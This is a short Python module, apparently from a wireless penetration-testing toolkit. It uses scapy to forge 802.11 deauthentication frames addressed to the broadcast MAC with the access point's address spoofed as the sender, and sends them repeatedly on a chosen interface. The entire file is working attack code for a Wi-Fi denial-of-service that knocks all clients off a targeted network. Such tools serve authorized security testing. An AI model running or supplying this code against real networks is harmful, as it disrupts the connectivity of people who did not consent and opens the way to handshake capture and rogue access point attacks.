# Module: deauth
# Description: Helper - Performs Broadcast based Deauthentication
# Author: Nick Sanzotta
# Contributors: 
# Version: v 1.09132017
try:
	import os, sys, threading
	from scapy.all import *
	from theme import *
except Exception as e:
	print('\n [!] Error %s' % (e))

class deAuth(threading.Thread):
	def __init__(self, apmac, deauthPktCount, interface):
		threading.Thread.__init__(self)
		self.setDaemon(0) # Creates thread in non-daemon mode
		self.apmac = apmac
		self.deauthPktCount = deauthPktCount
		self.interface = interface
		self.wirelessInt = str(self.interface.get_ifname())
		self.broadcastMac = "ff:ff:ff:ff:ff:ff"
		self.deauthPacket = RadioTap()/Dot11(type=0,subtype=12,addr1=self.broadcastMac,addr2=self.apmac, addr3=self.apmac)/Dot11Deauth(reason=7)

	def run(self):
		try:
			print(normal('*') + '%s is sending %s deauthentication packets to %s' % (self.wirelessInt, self.deauthPktCount, self.apmac))
			sendp(self.deauthPacket, iface=self.wirelessInt, count=self.deauthPktCount, inter=.2, verbose=False)
		except Exception as e:
			print('\n'+red('!')+'Deauthentication Aborted: %s' % (e))
